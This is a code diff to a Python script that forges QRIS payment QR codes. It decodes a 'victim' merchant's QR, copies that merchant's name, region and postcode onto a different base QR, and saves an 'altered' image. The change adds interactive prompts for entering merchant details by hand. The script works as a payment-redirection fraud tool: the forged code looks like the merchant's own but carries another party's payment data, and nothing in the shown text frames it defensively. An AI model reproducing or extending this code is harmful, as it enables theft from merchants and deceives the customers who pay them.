@@ -46,11 +46,14 @@ def create(data, out='altered.jpeg'):
     qr.make(fit=True)
     qr.make_image(fill='black', back_color='white').save(out)
 
-baseqr = parse(decode(cv2.imread('baseqr.jpeg'))[0].data.decode('utf-8'))
-victim = parse(decode(cv2.imread('victim.jpeg'))[0].data.decode('utf-8'))
+try: baseqr = parse(decode(cv2.imread('baseqr.jpeg'))[0].data.decode('utf-8'))
+except: baseqr = parse(decode(cv2.imread(input("Base QRIS : ")))[0].data.decode('utf-8'))
+try:
+    victim = parse(decode(cv2.imread('victim.jpeg'))[0].data.decode('utf-8'))
+    name, region, postcode = victim.get('59'), victim.get('60'), victim.get('61')
+except: name, region, postcode = input("Merchant name : "), input("Merchant region : "), input("Postal Code : ")
 
-print("QRIS Altered")
-name, region, postcode = victim.get('59'), victim.get('60'), victim.get('61')
+print("\nQRIS Altered")
 print(f"Name: {baseqr.get('59')} -> {name}")
 print(f"Region: {baseqr.get('60')} -> {region}")
 print(f"Postcode: {baseqr.get('61')} -> {postcode}")
